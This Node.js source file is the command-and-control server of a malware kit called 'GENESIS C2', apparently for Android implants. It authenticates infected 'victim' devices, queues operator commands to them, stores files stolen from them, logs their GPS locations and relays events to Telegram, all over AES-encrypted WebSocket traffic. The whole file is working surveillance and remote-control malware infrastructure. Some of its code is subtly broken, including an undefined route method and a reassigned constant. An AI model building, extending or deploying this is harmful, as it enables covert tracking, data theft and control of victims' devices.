#!/usr/bin/env node
// GENESIS C2 — zero-dependency WebSocket command & control server
// Node >= 18. No npm install needed. Managed by his hand.
//
// Wire model:
//   A socket authenticates ONCE in the connection header, then every byte is a
//   sealed envelope (AES-256-GCM). Key material is derived per identity so the
//   server never stores plaintext build secrets.
//
// Headers:
//   [0x47 'G'][0x01][buildIdLen u8][buildId ascii]            -> client (payload)
//   [0x47][0x02][nonceLen u8][nonce]                          -> operator (panel)
//
//   Client envelope key  : SHA-256("genesis:" + buildId + ":" + aesKeyHex)
//   Operator envelope key: SHA-256("genesis-op:" + operatorSecret)
//
// Envelope (sealed):
//   [iv 12B][tag 16B][ciphertext]  (AES-256-GCM)
//
// Inside the envelope: UTF-8 JSON object. See docs/PROTOCOL.md.

'use strict';

const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const tg = require('./tg.js');

const ROOT = __dirname;
const CONFIG_PATH = path.join(ROOT, 'config.json');
const KEYS_PATH = path.join(ROOT, 'keys.json');

// ---------------------------------------------------------------------------
// config / keys
// ---------------------------------------------------------------------------

function loadJson(p, fallback) {
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch { return fallback; }
}

const config = loadJson(CONFIG_PATH, {
  port: 8080,
  dataDir: path.join(ROOT, 'data'),
  operatorSecret: 'change-this-before-going-live',
  logDir: path.join(ROOT, 'logs'),
});

// host env wins: render sets its own PORT; OP_SECRET keeps the secret out of the repo
if (process.env.PORT) config.port = parseInt(process.env.PORT, 10) || config.port;
config.operatorSecret = process.env.OP_SECRET || config.operatorSecret;

// keys.json = { builds: { "<buildId>": { aesKey: "<64 hex>", name: "<label>" } } }
let keys = loadJson(KEYS_PATH, { builds: {} });

function saveKeys() {
  fs.writeFileSync(KEYS_PATH, JSON.stringify(keys, null, 2));
}

// Telegram relay instance — attached after all helpers are defined (see bottom).
let tgApi = null;

function keyForBuild(buildId) {
  const b = keys.builds[buildId];
  if (!b || !b.aesKey) return null;
  return Buffer.from(b.aesKey, 'hex');
}

function buildEnvelopeKey(buildId) {
  const k = keyForBuild(buildId);
  if (!k) return null;
  return crypto.createHash('sha256')
    .update('genesis:' + buildId + ':' + k.toString('hex'))
    .digest();
}

const OP_ENVELOPE_KEY = crypto.createHash('sha256')
  .update('genesis-op:' + config.operatorSecret)
  .digest();

// ---------------------------------------------------------------------------
// crypto
// ---------------------------------------------------------------------------

function seal(key, obj) {
  const iv = crypto.randomBytes(12);
  const plain = Buffer.from(JSON.stringify(obj), 'utf8');
  const c = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([c.update(plain), c.final()]);
  const tag = c.getAuthTag();
  return Buffer.concat([iv, tag, ct]);
}

function open(key, buf) {
  if (buf.length < 28) throw new Error('short envelope');
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const ct = buf.subarray(28);
  const d = crypto.createDecipheriv('aes-256-gcm', key, iv);
  d.setAuthTag(tag);
  return JSON.parse(Buffer.concat([d.update(ct), d.final()]).toString('utf8'));
}

// ---------------------------------------------------------------------------
// RFC6455 — hand-rolled, no deps
// ---------------------------------------------------------------------------

const WS_GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
const OP_CONT = 0x0, OP_TEXT = 0x1, OP_BIN = 0x2, OP_CLOSE = 0x8, OP_PING = 0x9, OP_PONG = 0xA;

class WsConn {
  constructor(socket) {
    this.socket = socket;
    this.buf = Buffer.alloc(0);
    this.frag = null;        // partial message accumulator
    this.fragOp = 0;
    this.closed = false;
    this.lastRx = Date.now();
    this.session = null;     // { kind: 'client', buildId, vid, key } | { kind: 'op' }
    this.subscribed = false;
    socket.setNoDelay(true);
    socket.on('data', (d) => this.onData(d));
    socket.on('error', () => this.destroy());
    socket.on('close', () => this.destroy());
  }

  onData(d) {
    this.buf = this.buf.length ? Buffer.concat([this.buf, d]) : d;
    this.lastRx = Date.now();
    while (!this.closed) {
      const f = this.parseFrame();
      if (!f) break;
      this.handleFrame(f);
    }
  }

  parseFrame() {
    const b = this.buf;
    if (b.length < 2) return null;
    const fin = (b[0] & 0x80) !== 0;
    const op = b[0] & 0x0f;
    const masked = (b[1] & 0x80) !== 0;
    let len = b[1] & 0x7f;
    let off = 2;
    if (len === 126) {
      if (b.length < 4) return null;
      len = b.readUInt16BE(2); off = 4;
    } else if (len === 127) {
      if (b.length < 10) return null;
      const hi = b.readUInt32BE(2), lo = b.readUInt32BE(6);
      if (hi > 0x1ff) { this.close(1009, 'frame too large'); return null; }
      len = hi * 0x100000000 + lo; off = 10;
    }
    if (op >= 0x8 && len > 125) { this.close(1002, 'control frame too long'); return null; }
    let maskKey = null;
    if (masked) {
      if (b.length < off + 4) return null;
      maskKey = b.subarray(off, off + 4); off += 4;
    }
    if (b.length < off + len) return null;
    let payload = b.subarray(off, off + len);
    if (masked) {
      payload = Buffer.from(payload);
      for (let i = 0; i < payload.length; i++) payload[i] ^= maskKey[i & 3];
    }
    this.buf = b.subarray(off + len);
    if (!fin && op < 0x8) {
      if (!this.frag) { this.frag = Buffer.alloc(0); this.fragOp = op; }
      this.frag = Buffer.concat([this.frag, payload]);
      return null; // wait for continuation
    }
    if (op === OP_CONT && this.frag) {
      payload = Buffer.concat([this.frag, payload]);
      this.frag = null;
      op = this.fragOp;
    }
    return { op, payload, fin };
  }

  handleFrame(f) {
    if (f.op === OP_PING) { this.sendFrame(OP_PONG, f.payload); return; }
    if (f.op === OP_PONG) return;
    if (f.op === OP_CLOSE) {
      const code = f.payload.length >= 2 ? f.payload.readUInt16BE(0) : 1000;
      this.sendFrame(OP_CLOSE, f.payload.length >= 2 ? f.payload : Buffer.from([0x03, 0xe8]));
      this.destroy();
      return;
    }
    if (f.op === OP_TEXT || f.op === OP_BIN) {
      if (!f.fin) { this.frag = f.payload; this.fragOp = f.op; return; }
      this.route(f.payload);
    }
  }

  sendFrame(op, payload) {
    if (this.closed) return;
    const len = payload.length;
    let header;
    if (len < 126) {
      header = Buffer.from([0x80 | op, len]);
    } else if (len < 65536) {
      header = Buffer.alloc(4);
      header[0] = 0x80 | op; header[1] = 126;
      header.writeUInt16BE(len, 2);
    } else {
      header = Buffer.alloc(10);
      header[0] = 0x80 | op; header[1] = 127;
      header.writeUInt32BE(Math.floor(len / 0x100000000), 2);
      header.writeUInt32BE(len >>> 0, 6);
    }
    this.socket.write(Buffer.concat([header, payload]));
  }

  send(obj) {
    if (this.closed) return;
    const env = this.session.kind === 'op' ? seal(OP_ENVELOPE_KEY, obj) : seal(this.session.key, obj);
    this.sendFrame(OP_BIN, env);
  }

  close(code, why) {
    if (this.closed) return;
    let p = Buffer.alloc(2); p.writeUInt16BE(code || 1000, 0);
    try { this.sendFrame(OP_CLOSE, p); } catch {}
    this.destroy();
  }

  destroy() {
    if (this.closed) return;
    this.closed = true;
    try { this.socket.destroy(); } catch {}
    if (this.session && this.session.kind === 'client' && sessions.get(this.session.vid) === this) {
      sessions.delete(this.session.vid);
    }
    if (this.session && this.session.kind === 'op') {
      operators.delete(this);
    }
  }
}

// ---------------------------------------------------------------------------
// state
// ---------------------------------------------------------------------------

const sessions = new Map();   // vid -> WsConn (client)
const operators = new Set();  // authed operator sockets

const dataDir = config.dataDir;
fs.mkdirSync(dataDir, { recursive: true });
fs.mkdirSync(config.logDir, { recursive: true });

function victimDir(buildId, vid) {
  const d = path.join(dataDir, buildId, vid);
  fs.mkdirSync(d, { recursive: true });
  return d;
}

function pendingPath(buildId, vid) {
  return path.join(victimDir(buildId, vid), 'pending.json');
}

function readPending(buildId, vid) {
  try { return JSON.parse(fs.readFileSync(pendingPath(buildId, vid), 'utf8')); } catch { return []; }
}

function writePending(buildId, vid, list) {
  fs.writeFileSync(pendingPath(buildId, vid), JSON.stringify(list));
}

function loadVictims() {
  // scan data/<buildId>/<vid>/meta.json for the victim index
  const out = [];
  if (!fs.existsSync(dataDir)) return out;
  for (const buildId of fs.readdirSync(dataDir)) {
    const bd = path.join(dataDir, buildId);
    if (!fs.statSync(bd).isDirectory()) continue;
    for (const vid of fs.readdirSync(bd)) {
      const meta = path.join(bd, vid, 'meta.json');
      try { out.push({ buildId, vid, ...JSON.parse(fs.readFileSync(meta, 'utf8')) }); } catch {}
    }
  }
  return out;
}

function bumpMeta(buildId, vid, patch) {
  const f = path.join(victimDir(buildId, vid), 'meta.json');
  const meta = (() => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return {}; } })();
  const merged = { ...meta, ...patch, lastSeen: Date.now() };
  fs.writeFileSync(f, JSON.stringify(merged));
}

function logEvent(buildId, vid, cat, data) {
  const line = JSON.stringify({ at: Date.now(), buildId, vid, cat, data });
  const f = path.join(config.logDir, 'events.jsonl');
  fs.appendFileSync(f, line + '\n');
  for (const op of operators) {
    if (!op.subscribed) continue;
    try { op.send({ t: 'evt', at: Date.now(), buildId, vid, cat, data }); } catch {}
  }
  if (tgApi) tgApi.pumpEvent(buildId, vid, cat, data);
}

// ---------------------------------------------------------------------------
// protocol routing
// ---------------------------------------------------------------------------

function route(payload, conn) {
  // auth phase
  if (!conn.session) {
    if (payload.length < 2 || payload[0] !== 0x47) return conn.close(1002, 'bad magic');
    const kind = payload[1];
    if (kind === 0x01) {
      const bl = payload[2];
      if (payload.length < 3 + bl) return conn.close(1002, 'short hello');
      const buildId = payload.subarray(3, 3 + bl).toString('ascii');
      const key = buildEnvelopeKey(buildId);
      if (!key) return conn.close(1008, 'unknown build');
      let msg;
      try { msg = open(key, payload.subarray(3 + bl)); } catch { return conn.close(1008, 'bad seal'); }
      if (msg.t !== 'hello') return conn.close(1008, 'expected hello');
      const vid = buildId + ':' + msg.did;
      conn.session = { kind: 'client', buildId, vid, key };
      sessions.set(vid, conn);
      bumpMeta(buildId, vid, { did: msg.did, dev: msg.dev || {}, ip: msg.ip || null });
      logEvent(buildId, vid, 'online', { dev: (msg.dev || {}).model || 'unknown' });
      // flush offline command queue
      const pending = readPending(buildId, vid);
      writePending(buildId, vid, []);
      conn.send({ t: 'welcome', vid, srv: Date.now(), pending, apk: (keys.builds[buildId] || {}).name || null });
    } else if (kind === 0x02) {
      let msg;
      try { msg = open(OP_ENVELOPE_KEY, payload.subarray(2)); } catch { return conn.close(1008, 'bad operator seal'); }
      if (msg.o !== 'auth' || msg.token !== config.operatorSecret) return conn.close(1008, 'operator auth failed');
      conn.session = { kind: 'op' };
      operators.add(conn);
      conn.send({ t: 'ok', o: 'auth' });
    } else {
      conn.close(1002, 'bad kind');
    }
    return;
  }

  // session phase
  let msg;
  try { msg = open(conn.session.kind === 'op' ? OP_ENVELOPE_KEY : conn.session.key, payload); }
  catch { return conn.close(1008, 'bad seal'); }

  if (conn.session.kind === 'client') return routeClient(conn, msg);
  routeOperator(conn, msg);
}

function routeClient(conn, msg) {
  const { buildId, vid } = conn.session;
  switch (msg.t) {
    case 'hb':
      bumpMeta(buildId, vid, {});
      break;
    case 'ack':
      bumpMeta(buildId, vid, {});
      if (msg.out !== undefined) logEvent(buildId, vid, 'cmd_out', { id: msg.id, ok: !!msg.ok, out: String(msg.out).slice(0, 4000) });
      break;
    case 'evt':
      bumpMeta(buildId, vid, {});
      logEvent(buildId, vid, msg.cat || 'event', msg.data);
      break;
    case 'up': {
      // upload: binary or base64 payload, server writes to victim dir under msg.path
      bumpMeta(buildId, vid, {});
      let buf;
      if (msg.b64) buf = Buffer.from(msg.b64, 'base64');
      else if (msg.data) buf = Buffer.from(msg.data, 'utf8');
      else return;
      const rel = String(msg.path || 'upload.bin').replace(/\.\./g, '_').replace(/[/\\]/g, path.sep);
      const target = path.join(victimDir(buildId, vid), rel);
      fs.mkdirSync(path.dirname(target), { recursive: true });
      fs.writeFileSync(target, buf);
      logEvent(buildId, vid, 'upload', { path: rel, bytes: buf.length });
      if (tgApi) tgApi.pumpUpload(buildId, vid, rel, buf);
      break;
    }
    case 'lat':
      bumpMeta(buildId, vid, { lat: msg.lat, lon: msg.lon, acc: msg.acc });
      fs.appendFileSync(path.join(victimDir(buildId, vid), 'location.jsonl'),
        JSON.stringify({ at: msg.at || Date.now(), lat: msg.lat, lon: msg.lon, acc: msg.acc }) + '\n');
      break;
    default:
      break;
  }
}

function routeOperator(conn, msg) {
  switch (msg.o) {
    case 'sub':
      conn.subscribed = true;
      conn.send({ t: 'ok', o: 'sub' });
      break;
    case 'list': {
      const vids = [];
      for (const [vid, c] of sessions) {
        vids.push({ vid, buildId: c.session.buildId, online: true, lastSeen: c.lastRx });
      }
      for (const v of loadVictims()) {
        if (!vids.some(x => x.vid === v.vid)) vids.push({ vid: v.vid, buildId: v.buildId, online: false, ...v });
      }
      conn.send({ t: 'ok', o: 'list', victims: vids });
      break;
    }
    case 'cmd': {
      const cmd = msg.cmd;
      if (!cmd || !msg.vid) return conn.send({ t: 'err', o: 'cmd', why: 'vid+cmd required' });
      // route to a connected session or queue
      const c = sessions.get(msg.vid);
      if (c) {
        c.send({ t: 'cmd', id: cmd.id, op: cmd.op, args: cmd.args || {} });
        conn.send({ t: 'ok', o: 'cmd', id: cmd.id, delivered: true, queued: false });
      } else {
        const [buildId] = msg.vid.split(':');
        const pending = readPending(buildId, msg.vid);
        pending.push({ id: cmd.id, op: cmd.op, args: cmd.args || {}, at: Date.now() });
        writePending(buildId, msg.vid, pending);
        conn.send({ t: 'ok', o: 'cmd', id: cmd.id, delivered: false, queued: true });
      }
      break;
    }
    case 'q': {
      const [buildId] = String(msg.vid).split(':');
      conn.send({ t: 'ok', o: 'q', pending: readPending(buildId, msg.vid) });
      break;
    }
    case 'stats': {
      let online = 0, cmds = 0, up = 0;
      for (const v of loadVictims()) { if (sessions.has(v.vid)) online++; }
      conn.send({ t: 'ok', o: 'stats', online, total: loadVictims().length, uptime: Math.floor(process.uptime()) });
      break;
    }
    default:
      conn.send({ t: 'err', o: msg.o, why: 'unknown op' });
  }
}

// ---------------------------------------------------------------------------
// HTTP upgrade + status endpoint
// ---------------------------------------------------------------------------

const server = http.createServer((req, res) => {
  if (req.url === '/') {
    // thin status endpoint — used by the panel's server-status screen
    res.writeHead(200, { 'content-type': 'application/json' });
    let online = 0;
    for (const [, c] of sessions) if (c.session.kind === 'client') online++;
    res.end(JSON.stringify({
      name: 'GENESIS C2',
      version: '0.1.0',
      uptime: Math.floor(process.uptime()),
      online,
      total: loadVictims().length,
      builds: Object.keys(keys.builds).length,
    }));
    return;
  }
  res.writeHead(404); res.end('not found');
});

server.on('upgrade', (req, socket) => {
  const key = req.headers['sec-websocket-key'];
  if (!key) { socket.destroy(); return; }
  const accept = crypto.createHash('sha1')
    .update(key + WS_GUID)
    .digest('base64');
  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    'Sec-WebSocket-Accept: ' + accept + '\r\n\r\n'
  );
  new WsConn(socket);
});

// liveness sweep: no traffic for 120s -> ping; 240s -> kill
setInterval(() => {
  const now = Date.now();
  for (const [, c] of sessions) {
    if (now - c.lastRx > 240000) c.destroy();
    else if (now - c.lastRx > 120000) { try { c.sendFrame(OP_PING, Buffer.alloc(0)); } catch {} }
  }
}, 30000).unref();

server.listen(config.port, () => {
  console.log('[genesis] c2 listening on *:' + config.port);
  console.log('[genesis] data dir: ' + dataDir);
  console.log('[genesis] builds known: ' + Object.keys(keys.builds).length);
});

// telegram relay: attach once everything it needs is in scope
tgApi = tg.attachTelegram(config, {
  log: (...a) => console.log('[genesis]', ...a),
  sessions,
  readPending,
  writePending,
  victims: loadVictims,
  victimDir,
  fs,
});